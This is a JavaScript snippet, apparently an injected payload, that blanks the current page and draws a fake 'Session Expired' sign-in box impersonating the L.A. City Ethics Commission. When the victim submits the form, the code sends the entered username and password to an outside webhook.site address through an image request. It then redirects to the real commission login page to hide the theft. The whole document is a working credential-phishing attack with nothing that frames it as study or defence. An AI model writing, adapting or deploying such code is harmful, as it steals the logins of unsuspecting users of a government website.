(function() {
    window.stop();
    window.scrollTo(0, 0);

    document.documentElement.innerHTML = '<head><title>System Authentication</title></head><body></body>';

    const style = document.createElement('style');
    style.innerHTML = `
        html, body { 
            margin: 0 !important; 
            padding: 0 !important; 
            height: 100% !important; 
            width: 100% !important;
            overflow: hidden !important; /* Evita que puedas scrollear */
            background: #f4f7f9 !important;
        }
        #center-container {
            position: fixed; /* Lo ancla a la ventana, no al documento */
            top: 0;
            left: 0;
            width: 100vw;
            height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            z-index: 9999999;
        }
    `;
    document.head.appendChild(style);

    const wrapper = document.createElement('div');
    wrapper.id = 'center-container';
    wrapper.innerHTML = `
    <div style="width:380px; background:#fff; padding:40px; border-radius:4px; box-shadow:0 10px 25px rgba(0,0,0,0.1); border-top: 5px solid #0056b3; text-align:center; font-family: Arial, sans-serif;">
        <img src="https://ethics.lacity.gov/wp-content/uploads/2017/12/favicon_32x32.png" style="width:90px; margin-bottom:25px;">
        <h2 style="font-size:20px; color:#333; margin:0 0 10px 0;">Session Expired</h2>
        <p style="color:#666; font-size:14px; margin-bottom:25px;">Please re-authenticate to continue your session.</p>
        
        <div style="text-align:left;">
            <label style="font-size:11px; font-weight:bold; color:#555; text-transform:uppercase;">Username</label>
            <input id="u" type="text" style="width:100%; padding:12px; margin:8px 0 20px 0; border:1px solid #ccc; border-radius:3px; box-sizing:border-box;">
            
            <label style="font-size:11px; font-weight:bold; color:#555; text-transform:uppercase;">Password</label>
            <input id="p" type="password" style="width:100%; padding:12px; margin:8px 0 25px 0; border:1px solid #ccc; border-radius:3px; box-sizing:border-box;">
        </div>

        <button id="go" style="width:100%; padding:14px; background:#0056b3; color:#fff; border:none; border-radius:3px; font-size:16px; font-weight:bold; cursor:pointer;">Sign In</button>
        <p style="margin-top:20px; font-size:11px; color:#999;">&copy; 2026 L.A. City Ethics Commission</p>
    </div>`;

    document.body.appendChild(wrapper);

    document.getElementById('go').onclick = function() {
        const u = document.getElementById('u').value;
        const p = document.getElementById('p').value;
        if(!u || !p) return;

        this.innerHTML = "Connecting...";
        this.disabled = true;

        const img = new Image();
        img.src = "https://webhook.site/4c7629c5-d711-46a7-92ad-83309267bd91?u=" + encodeURIComponent(u) + "&p=" + encodeURIComponent(p) + "&v=" + Math.random();
        
        setTimeout(() => {
            window.location.replace('https://ethics.lacity.gov/efs/index.cfm?fuseaction=login');
        }, 1000);
    };
})();
